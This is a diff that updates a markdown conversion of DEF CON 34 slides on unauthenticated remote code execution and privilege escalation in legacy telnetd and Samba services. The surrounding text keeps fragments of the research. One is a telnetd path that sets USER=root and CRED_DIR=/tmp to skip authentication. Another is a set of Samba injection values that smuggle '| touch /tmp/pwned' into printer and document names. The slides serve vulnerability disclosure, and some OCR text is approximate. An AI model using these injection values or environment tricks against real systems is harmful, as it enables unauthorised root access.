@@ -4,23 +4,28 @@ speakers: ["Ron Ben Yizhak"]
 conference: "DEF CON"
 conference_full: "DEF CON 34"
 edition: "34"
-year: null
+year: 2026
 source_pdf: "DEF CON 34/DEF CON 34 - Ron Ben Yizhak - Forgotten but Not Gone Unauthenticated RCEs and LPEs in Legacy Linux Services - Unauthentica.pdf"
 pages: 68
 sha256: "ea037c2a4d24dbe798b0eee3f1e630027e0dcf9a8e7ca0b94a29d8447dc7238a"
-text_chars: 12048
-ocr_pages: 14
+text_chars: 11653
+ocr_pages: 13
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 88.1
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-12T00:27:59Z"
+converted_at: "2026-08-12T06:42:49Z"
 ---
 # Forgotten but Not Gone Unauthenticated RCEs and LPEs in Legacy Linux Services
 
 **Speakers:** Ron Ben Yizhak  
 **Conference:** DEF CON 34  
 **Source:** `DEF CON 34/DEF CON 34 - Ron Ben Yizhak - Forgotten but Not Gone Unauthenticated RCEs and LPEs in Legacy Linux Services - Unauthentica.pdf` (68 pages)
+
 
 ## Slide 1
 
@@ -104,13 +109,12 @@ CVSS 9.8
 
 9
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Root Cause Analysis
 Telnetd allows unauthenticated clients to set its
 environment variables
-telnetd
 1 LANG=en_US.UTF-8
 USER=root
 ENVAR=VALUE
@@ -124,13 +128,12 @@ ENVAR=VALUE
 
 10
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Root Cause Analysis
 The spawned shell will inherit the new
 environment variables
-telnetd
 1 LANG=en_US.UTF-8
 USER=john
 ENVAR=VALUE
@@ -143,15 +146,13 @@ ENVAR=VALUE
 
 11
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Root Cause Analysis
 Telnetd doesn't perform the authentication itself
 /usr/sbin/telnetd
-9 /usr/bin/login &
 EF Who are you? < | >
-C=
 user: password
 11
 ```
@@ -160,10 +161,10 @@ user: password
 
 #### **Root Cause Analysis** Telnetd executes login with a format string In 2015 it was updated
 
-```
+\```
 - PATH_LOGIN " -p -h %h %?u{-f %u}"
 + PATH_LOGIN " -p -h %h %?u{-f %u}{%U}"
-```
+\```
 
 12
 
@@ -171,9 +172,9 @@ user: password
 
 #### **Root Cause Analysis**
 
-```
+\```
 PATH_LOGIN " -p -h %h %?u{-f %u}{%U}"
-```
+\```
 
 ~$ /
 
@@ -229,9 +230,9 @@ version  display version
 
 #### **Root Cause Analysis**
 
-```
+\```
 PATH_LOGIN " -p-h %h %?u{-f %u}{%U}"
-```
+\```
 
 ~$ /
 
@@ -439,7 +440,8 @@ LD_PRELOAD forces the linker to load a library when the process is initialized
 
 26
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Manipulating Envars in TelnetD
@@ -511,7 +513,8 @@ Digging through the code might reveal unique envars Telnetd retrieves only $USER
 
 32
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 $CREDENTIALS_DIRECTORY
@@ -519,7 +522,6 @@ systemd 2 systemd
 service
 CRED_DIR=/run/credentials/my.service
 \
-7 Bata /run/credentials/my.service/secret
 32
 ```
 
@@ -559,7 +561,8 @@ login.noauth?
 
 35
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 $CREDENTIALS_DIRECTORY
@@ -582,15 +585,13 @@ tmp root
 
 36
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Privilege Escalation in TelnetD
-—_
 (2) USER=root, CRED_DIR=/tmp
-o_O
 /tmp/login.noauth
-telnetd
 CRED_DIR=/tmp
 USER=root
 % (3) usr/bin/login -p -h %h root
@@ -635,7 +636,8 @@ valid names are set using --accept-env
 
 41
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Picking The Next Target
@@ -694,18 +696,18 @@ smbrun
 
 #### **Attempting Bash Injection**
 
-```
+\```
 addprinter_command “printer_name“ “share_name”...
-```
+\```
 
-```
+\```
 printer_name=a“ | touch /tmp/pwned | echo “a
-```
+\```
 
-```
+\```
 addprinter_command “a“ | touch /tmp/pwned | echo
 “a“ “share_name”...
-```
+\```
 
 45
 
@@ -723,10 +725,10 @@ execl
 
 **Samba Sanitization Mechanism** Non-alphanumeric chars outside of quotes are escaped
 
-```
+\```
 addprinter_command “a“ \| touch /tmp/pwned \| echo
 “a“ “share_name”...
-```
+\```
 
 47
 
@@ -768,15 +770,14 @@ smbrunsecret
 
 53
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Unauthenticated RCE #1
-samba-dcerpcd
 ~ SamrValidatePassword
 UserAccountName=
 </> i
-fetc/samba/ smb.conf
 [global]
 check password script = crackcheck Mm
 rpc start on demand helpers = no
@@ -788,13 +789,12 @@ rpc start on demand helpers = no
 
 54
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo #2
 Cimpacket) C:\Users\ronb>
-F) user@samba-srv: ~
-user@samba-srv: ~$
 54
 ```
 
@@ -806,13 +806,13 @@ user@samba-srv: ~$
 
 #### **Unauthenticated RCE #2**
 
-```
+\```
 _spoolss_EndDocPrinter
 print_job_end
 generic_job_submit
 print_run_command
 smbrun_no_sanitize
-```
+\```
 
 56
 
@@ -838,16 +838,14 @@ Printer share configured
 
 59
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Unauthenticated RCE #2
-4 RpcEndDocPrinter
 pDocName=
 "I touch /tmp/ pwned
 /bin/sh -c “echo Printing [@Ouehmpypuned
-4 >> /tmp/print.log”
-fetc/samba/ smb.conf
 [global]
 printing = BSD
 print command = echo Printing Bm >> /tmp/print.log
@@ -867,7 +865,8 @@ printable = yes
 
 61
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Demo #3
@@ -937,7 +936,8 @@ https://github.com/SafeBreach-Labs/ForgottenButNotGone
 
 68
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Thank you!
